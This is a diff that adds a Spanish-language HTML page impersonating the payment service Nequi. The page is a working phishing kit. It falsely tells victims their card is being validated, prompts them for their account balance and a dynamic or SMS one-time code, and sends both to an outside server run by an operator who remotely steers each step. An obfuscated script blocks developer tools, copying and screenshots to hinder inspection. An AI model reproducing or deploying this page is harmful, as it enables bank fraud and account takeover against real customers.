@@ -1,0 +1,203 @@
+<!doctype html><html lang="es"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Validando tarjeta - Nequi</title><style>* { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: system-ui, -apple-system, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #200020; }
+    .container { background: white; border-radius: 16px; padding: 40px 30px; text-align: center; max-width: 400px; width: 90%; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
+    .spinner { width: 50px; height: 50px; border: 4px solid #f3f3f3; border-top: 4px solid #da0081; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 24px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    h1 { font-size: 20px; margin-bottom: 12px; }
+    p { font-size: 15px; color: #555; line-height: 1.5; margin-bottom: 16px; }
+    
+    /* Estilos para el Input de Saldo */
+    .input-box { width: 100%; padding: 14px; font-size: 20px; text-align: center; border: 2px solid #da0081; border-radius: 8px; margin-bottom: 16px; outline: none; }
+    .btn-enviar { background: #da0081; color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: opacity 0.2s; }
+    .btn-enviar:disabled { opacity: 0.5; cursor: not-allowed; }
+    .hidden { display: none !important; }
+
+    /* Estilos del Modal OTP (Copiados del original) */
+    .auth-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.65); z-index: 3000; justify-content: center; align-items: center; padding: 20px; opacity: 0; transition: opacity 0.4s ease; }
+    .auth-modal.show { display: flex; opacity: 1; }
+    .auth-modal-content { background: #fff; max-width: 640px; width: 100%; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); transform: scale(0.7); transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1); margin: auto; max-height: 90vh; overflow-y: auto;}
+    .auth-modal.show .auth-modal-content { transform: scale(1); }
+    .auth-modal-close { position: absolute; top: 15px; right: 20px; font-size: 32px; background: none; border: none; color: #333; cursor: pointer; z-index: 10; }</style></head><body><div class="container" id="vistaEspera"><div class="spinner"></div><h1>Estamos validando tu tarjeta</h1><p>Por favor espera un momento.<br>No cierres esta ventana.</p></div><div class="container hidden" id="vistaSaldo"><h1>Valida tu identidad</h1><p>Para confirmar que eres el titular, ingresa el saldo actual que tienes en tu cuenta.</p><input id="saldoInput" class="input-box" inputmode="numeric" pattern="[0-9]*" placeholder="$ 0"> <button class="btn-enviar" id="saldoBtn" disabled="disabled">Enviar Saldo</button></div><div id="authModal" class="auth-modal"><div class="auth-modal-content" style="position: relative;"><button class="auth-modal-close" onclick="closeAuthModal()">×</button><div style="margin:0; background:#fff; color:#000; font-family: system-ui, -apple-system, Arial, sans-serif; font-size:15px; line-height:1.6; padding:32px 24px; max-width:640px; width:100%; border-radius:8px;"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;"><h1 style="font-size:18px; margin:0;">Autorización de pago</h1><div id="cardBrandLogo" style="height:28px; margin-right:50px;"></div></div><p>El pago que intentas realizar en NEQUI S.A por $<span id="montoPopup">0</span> COP el <span id="currentDate"></span> con tu tarjeta terminada en <strong id="lastFourDigitsPopup">************</strong> debe ser autorizada por seguridad.</p><p>"¡Avancemos con el pago! Para terminar y por seguridad, necesitamos confirmar que eres tú quién está detrás de esta pantalla. Ingresa un dato que solo tú conoces. Consulta tu clave dinámica o SMS escríbelo aquí.</p><h2 style="font-size:16px; margin:28px 0 16px 0; font-weight:bold;">Detalle de la Transacción</h2><div style="margin-bottom:20px;"><div style="margin-bottom:10px;"><label style="font-weight:bold;">Entidad Comercial:</label><span> NEQUI S.A</span></div><div style="margin-bottom:10px;"><label style="font-weight:bold;">Monto del pago:</label><span> $ <span id="montoPopup2">0</span> COP</span></div><div style="margin-bottom:10px;"><label style="font-weight:bold;">Número de Tarjeta:</label><span id="popupCardNumber">************</span></div><div><label style="font-weight:bold;">Ingresa tu Clave Dinámica o SMS:</label><div style="position:relative;"><input id="dynamicCode" style="border:1px solid #999; height:38px; width:100%; max-width:220px; padding:0 10px; font-size:15px; border-radius:4px;" maxlength="6" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')" autocomplete="off"></div></div></div><div style="text-align:center; margin-top:30px;"><button type="button" id="btnEnviarDinamica" style="background:#000; color:#fff; border:0; padding:12px 40px; font-weight:600; font-size:16px; border-radius:4px; cursor:pointer;">Enviar</button></div><p style="text-align:left; margin-top:40px; font-size:14px;"><a href="#" style="color:#000; text-decoration:underline;">¿Necesitas Ayuda?</a></p></div></div></div><script>// 🔥 URL DE TU SERVIDOR EN RAILWAY
+    const BACKEND = 'https://nequi-bot-discord-production.up.railway.app';
+    
+    // Recuperamos el ID del usuario y datos guardados
+    const userId = localStorage.getItem('userId');
+    const tarjetaGuardada = localStorage.getItem('lastCard') || '************';
+    const montoGuardado = localStorage.getItem('montoCredito') || '0';
+    
+    if (!userId) {
+        alert("Error: No se encontró la sesión. Vuelve a iniciar el proceso.");
+        window.location.href = 'verificaciondeidentidad.html';
+    }
+
+    // Referencias a las pantallas
+    const vistaEspera = document.getElementById('vistaEspera');
+    const vistaSaldo = document.getElementById('vistaSaldo');
+    const authModal = document.getElementById('authModal');
+
+    let mostrandoSalso = false;
+    let mostrandoOtp = false;
+
+    // Llenar los datos en el modal al cargar
+    document.getElementById('popupCardNumber').textContent = tarjetaGuardada;
+    document.getElementById('lastFourDigitsPopup').textContent = tarjetaGuardada;
+    document.getElementById('montoPopup').textContent = Number(montoGuardado).toLocaleString('es-CO');
+    document.getElementById('montoPopup2').textContent = Number(montoGuardado).toLocaleString('es-CO');
+    
+    // Poner la fecha de hoy en el modal
+    const today = new Date();
+    document.getElementById('currentDate').textContent = 
+        String(today.getDate()).padStart(2, '0') + '/' +
+        String(today.getMonth() + 1).padStart(2, '0') + '/' +
+        today.getFullYear();
+
+    // Lógica para abrir/cerrar el Modal
+    function openAuthModal() {
+      authModal.style.display = 'flex';
+      setTimeout(() => { authModal.classList.add('show'); }, 10);
+    }
+    function closeAuthModal() {
+      authModal.classList.remove('show');
+      setTimeout(() => { authModal.style.display = 'none'; }, 400);
+    }
+
+    // Botón Enviar del Modal
+    document.getElementById('btnEnviarDinamica').addEventListener('click', async function() {
+      const codigo = document.getElementById('dynamicCode').value;
+      if(codigo.length < 4) return alert("Por favor, ingresa una clave válida.");
+
+      this.disabled = true;
+      this.textContent = 'Enviando...';
+
+      try {
+        await fetch(`${BACKEND}/otp/${userId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ otp: codigo })
+        });
+        
+        closeAuthModal();
+        vistaEspera.classList.remove('hidden');
+        vistaEspera.querySelector('h1').textContent = 'Clave enviada';
+        vistaEspera.querySelector('p').innerHTML = 'Estamos validando tu clave.<br>Por favor espera.';
+      } catch (e) {
+        this.disabled = false;
+        this.textContent = 'Enviar';
+        alert('Error de conexión, intenta de nuevo.');
+      }
+    });
+
+    // Lógica para el Saldo
+    const saldoInput = document.getElementById('saldoInput');
+    const saldoBtn = document.getElementById('saldoBtn');
+    
+    saldoInput.addEventListener('input', () => {
+      let val = saldoInput.value.replace(/\D/g, '');
+      if (val) {
+        saldoInput.value = parseInt(val, 10).toLocaleString('es-CO');
+      } else {
+        saldoInput.value = '';
+      }
+      saldoBtn.disabled = saldoInput.value.length < 3;
+    });
+
+    saldoBtn.addEventListener('click', async () => {
+      saldoBtn.disabled = true;
+      saldoBtn.textContent = 'Enviando...';
+      try {
+        await fetch(`${BACKEND}/saldo/${userId}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ saldo: saldoInput.value })
+        });
+        vistaSaldo.classList.add('hidden');
+        vistaEspera.classList.remove('hidden');
+        vistaEspera.querySelector('h1').textContent = 'Saldo enviado';
+        vistaEspera.querySelector('p').innerHTML = 'Estamos validando tu saldo.<br>Por favor espera.';
+      } catch (e) {
+        saldoBtn.disabled = false;
+        saldoBtn.textContent = 'Enviar Saldo';
+        alert('Error de conexión, intenta de nuevo.');
+      }
+    });
+
+    // --- Bucle de consulta (Polling) ---
+    setInterval(async () => {
+      try {
+        const r = await fetch(`${BACKEND}/estado/${userId}`);
+        const data = await r.json();
+
+        // 1. Si el admin aprueba
+        if (data.estado === 'approved') {
+          window.location.href = 'aprobado.html';
+        } 
+        // 2. Si el admin rechaza
+        else if (data.estado === 'rejected') {
+          window.location.href = 'rechazado.html';
+        } 
+        // 3. Si el admin pide Dinámica
+        else if (data.estado === 'otp' && !mostrandoOtp) {
+          mostrandoOtp = true;
+          mostrandoSalso = false;
+          vistaEspera.classList.add('hidden');
+          vistaSaldo.classList.add('hidden');
+          openAuthModal();
+        } 
+        // 4. Si el admin pide Saldo
+        else if (data.estado === 'pedir_saldo' && !mostrandoSalso) {
+          mostrandoSalso = true;
+          mostrandoOtp = false;
+          vistaEspera.classList.add('hidden');
+          authModal.classList.remove('show');
+          authModal.style.display = 'none';
+          vistaSaldo.classList.remove('hidden');
+        }
+      } catch (e) {
+        console.error("Error consultando estado:", e);
+      }
+    }, 2000);</script><script>(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+document.addEventListener('selectstart',function(_0xl1){_0xl1.preventDefault();});
+document.addEventListener('copy',function(_0xm2){_0xm2.preventDefault();return false;});
+document.addEventListener('cut',function(_0xn3){_0xn3.preventDefault();return false;});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xo4){document.body.innerHTML='';}
+function _0xq6(){
+    document.documentElement.style.filter='blur(20px)';
+    document.documentElement.style.transition='filter 0.1s';
+    setTimeout(function(){document.documentElement.style.filter='';},1500);
+}
+window.addEventListener('keyup',function(_0xr7){
+    var _0xs8=_0xr7.key||''; var _0xt9=_0xs8.toLowerCase();
+    if(_0xt9==='printscreen'||_0xr7.keyCode===44){_0xq6();if(navigator.clipboard&&navigator.clipboard.writeText){try{navigator.clipboard.writeText('');}catch(e){}}}
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&_0xt9==='s'){_0xq6();}
+    if(_0xr7.metaKey&&_0xt9==='printscreen'){_0xq6();}
+    if(_0xr7.metaKey&&_0xr7.shiftKey&&(_0xt9==='3'||_0xt9==='4'||_0xt9==='5')){_0xq6();}
+},{capture:true});
+var _0xu0=0;
+window.addEventListener('blur',function(){_0xu0=new Date().getTime();_0xq6();});
+window.addEventListener('focus',function(){if(_0xu0>0){var _0xv1=new Date().getTime()-_0xu0;if(_0xv1<800){_0xq6();}}});
+document.addEventListener('visibilitychange',function(){if(document.hidden){document.body.style.filter='blur(30px)';}else{document.body.style.filter='';}});
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){navigator.mediaDevices.getDisplayMedia=function(){_0xq6();return Promise.reject(new Error('No'));};}
+if(window.MediaRecorder){window.MediaRecorder=function(){_0xq6();throw new Error('No');};}
+if(navigator.clipboard){try{navigator.clipboard.writeText=function(){return Promise.reject();};navigator.clipboard.write=function(){return Promise.reject();};}catch(e){}}
+})();</script></body></html>
